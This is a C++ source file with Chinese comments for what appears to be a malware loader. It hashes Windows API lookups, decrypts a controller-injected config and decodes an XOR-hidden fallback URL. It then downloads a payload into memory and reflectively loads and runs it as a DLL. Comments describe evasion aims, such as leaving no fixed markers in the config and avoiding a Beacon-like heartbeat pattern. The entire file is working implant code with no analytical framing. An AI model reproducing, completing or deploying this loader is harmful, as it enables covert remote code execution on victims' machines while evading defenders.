// main.cpp
#include "stdafx.h"
#include "ApiHash.h"
#include "PayloadLoader.h"
#include "MemoryModule.h"
#include "Info.h"
#include "ConfigBlock.h"
#include <stdlib.h>

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    // 1) 初始化哈希解析层（所有 API 从这里来）
    InitApiHash();
    if (!pNtCreateSection || !pLdrLoadDll) return 1;   // 初始化失败

    // 2) 解密主控注入的配置块（加密、随机长度、生成后无固定标记）
    //    static 保证整个进程生命周期有效（与原全局 g_Info 一致，被控入口可能持有该指针）
    static Info info;
    memset(&info, 0, sizeof(info));
    if (!DecryptConfig(&info)) return 2;

    // 3) 下载地址：优先配置块 URL；为空则用异或存储的兜底地址（导出名同样异或存储）
    static const unsigned char encUrl[25] = {
        0x32,0x2F,0x28,0x2D,0x64,0x70,0x4F,0x50,0x50,0x54,0x4A,0x55,
        0x48,0x57,0x46,0x58,0x45,0x19,0x03,0x02,0x1A,0x41,0x14,0x1D,
        0x1E };
    static const unsigned char encEntry[13] = {
        0x1E,0x37,0x30,0x1B,0x2B,0x0A,0x10,0x06,0x10,0x02,0x00,0x17,
        0x15 };

    // Rolling (position-dependent) key; no fixed single-byte XOR.
    char defUrl[128] = {0};
    for (int i = 0; i < (int)sizeof(encUrl); i++)
        defUrl[i] = (char)(encUrl[i] ^ (0x5A + (i & 0x3F)));
    const char* url = info.URL[0] ? info.URL : defUrl;

    char entry[64] = {0};
    for (int i = 0; i < (int)sizeof(encEntry); i++)
        entry[i] = (char)(encEntry[i] ^ (0x5A + (i & 0x3F)));

    // 4) 一次性下载，失败即退出（无固定重试次数/随机退避，避免 Beacon 心跳画像）
    PBYTE payload = NULL;
    DWORD payloadSize = 0;
    if (!DownloadToMemory(url, &payload, &payloadSize)) return 3;

    // 5) 内存加载并调用导出（把配置传给被控端 DLL）
    LoadAndRunPayload(payload, payloadSize, entry, (char*)&info);

    // 6) 释放
    free(payload);
    return 0;
}
